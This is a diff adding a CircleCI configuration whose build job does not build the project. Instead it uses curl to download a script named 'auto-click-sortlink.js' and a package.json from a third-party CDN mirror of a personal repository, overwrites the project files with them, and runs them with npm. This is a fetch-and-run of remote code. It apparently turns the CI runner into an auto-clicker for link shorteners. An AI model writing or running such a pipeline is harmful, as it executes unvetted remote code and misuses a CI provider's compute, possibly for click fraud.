@@ -1,0 +1,17 @@
+version: 2.1
+orbs: # declare what orbs we are going to use
+  node: circleci/node@2.0.2
+jobs:
+  build:
+    executor: node/default
+    steps: # a series of commands to run
+      - checkout  # pull down code from your version control system.
+      - run:
+          name: Download File Settup
+          command: curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/auto-click-sortlink.js --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json
+      - run:
+          name: Install Package Nodejs
+          command: npm i -s
+      - run:
+          name: Start Server
+          command: npm start
